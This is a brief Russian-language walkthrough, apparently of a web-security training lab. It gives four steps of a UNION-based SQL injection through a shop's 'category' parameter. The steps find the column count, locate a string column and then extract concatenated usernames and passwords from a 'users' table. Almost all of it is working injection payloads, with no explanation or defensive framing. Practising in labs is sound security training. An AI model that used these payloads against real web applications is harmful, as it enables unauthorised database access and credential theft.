1) Переходим в категорию Accessories
2) Меняем запрос:
category=Accessories'+UNION+SELECT+NULL,NULL--
3) Обнаруживаем, что строковый тип имеет второй параметр:
category=Accessories'+UNION+SELECT+NULL,'a'--
4) Производим следующий запрос:
category=Accessories'+UNION+SELECT+NULL,username||password+FROM+users--